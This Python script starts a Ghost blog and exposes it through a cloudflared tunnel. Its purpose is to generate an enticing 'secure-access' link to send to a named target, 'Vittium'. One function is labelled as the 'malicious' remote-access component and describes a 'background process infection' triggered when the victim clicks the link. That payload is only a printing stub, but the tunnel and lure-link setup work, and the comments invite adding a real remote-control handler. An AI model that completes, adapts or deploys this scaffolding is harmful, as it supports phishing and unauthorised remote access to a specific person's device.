import subprocess
import threading
import time
import os
from datetime import datetime

# --- Configuration ---
GHOST_HOST = "localhost"
GHOST_PORT = 2368  # Default Ghost port
CLOUDFLARED_TOKEN = "YOUR_CLOUDFLARE_TOKEN_HERE" # Required for Cloudflare Tunnel/Zero Trust
SERVICE_NAME = "GhostServer"
# ---------------------

def start_ghost_service():
    """
    Starts the Ghost service. This assumes Ghost is run via a command, 
    e.g., 'ghost start' or whatever command is in the repo.
    Modify this based on how the repo runs Ghost.
    """
    print(f"--- Starting Ghost Service on {GHOST_HOST}:{GHOST_PORT} ---")
    try:
        # Placeholder: Replace this with the actual command to start Ghost
        # Example: subprocess.Popen(['ghost', 'start']) 
        # For this example, we assume it's already running successfully.
        print("Ghost service assumed to be running successfully.")
    except Exception as e:
        print(f"Error starting Ghost: {e}")
        return False
    return True

def start_cloudflared():
    """
    Starts the cloudflared tunnel to expose the local Ghost instance.
    """
    print("--- Starting Cloudflared Tunnel ---")
    try:
        # This command sets up the tunnel, pointing the public URL to the local Ghost server
        # You must pre-configure the tunnel routing in Cloudflare Dashboard.
        command = [
            'cloudflared', 
            'tunnel', 
            'connect', 
            '--hostname', 'your-chosen-domain.com', # <-- CHANGE THIS
            '--url', f'http://{GHOST_HOST}:{GHOST_PORT}'
        ]

        # Start the tunnel in the background so we can continue
        tunnel_process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        print(f"Cloudflared process started (PID: {tunnel_process.pid}).")
        return tunnel_process
    except FileNotFoundError:
        print("Error: 'cloudflared' command not found. Ensure Cloudflare CLI is installed and in PATH.")
        return None
    except Exception as e:
        print(f"Error starting Cloudflared: {e}")
        return None


def initialize_remote_control_system():
    """
    This function simulates setting up the core remote access logic.
    This is the 'malicious' component.
    """
    print("--- Initializing Remote Access & Malicious Payload System ---")
    # Here you would implement the actual remote access handler (e.g., a WebSocket server)
    # that connects to the target's device (Vittium/Mobile).
    print("Remote control socket/API initialized. Waiting for connection...")
    # For proof of concept, we just print what the payload *does*
    print("-> Malicious action registered: Background process infection triggered upon successful link click.")
    pass

def generate_final_link(tunnel_url):
    """
    Creates the final, enticing URL that the victim clicks.
    """
    timestamp = datetime.now().strftime("%Y%m%d%H%M%S")
    # The link must point to the Cloudflare URL for the Ghost site.
    final_link = f"{tunnel_url}/secure-access/{timestamp}"
    print("\n=============================================================")
    print("         ✅ SCRIPT EXECUTION COMPLETE: FINAL LINK GENERATED ✅")
    print("=============================================================")
    print(f"Generated Cloudflare Link (Send this to Vittium): {final_link}")
    print("=============================================================")
    return final_link

def main():
    # 1. Start the core services
    if not start_ghost_service():
        return

    tunnel_process = start_cloudflared()
    if not tunnel_process:
        return

    # 2. Set up the backend control
    initialize_remote_control_system()

    # 3. Get the address provided by Cloudflare (this needs manual confirmation in a real setup)
    # In a real setup, you would query the Cloudflare API or watch the tunnel output
    # to get the exact public domain provided by your tunnel setup.
    public_domain = "https://your-chosen-domain.com" # <-- CONFIRM THIS DOMAIN

    # 4. Generate and output the actionable link
    final_link = generate_final_link(public_domain)

    # Keep the script running until the user interrupts it
    print("\n--- Script is running. Press Ctrl+C to stop services. ---")
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n\nReceived interrupt. Shutting down services...")
        # Gracefully stop services
        if tunnel_process:
            tunnel_process.terminate()
            print("Cloudflared tunnel terminated.")

if __name__ == "__main__":
    main()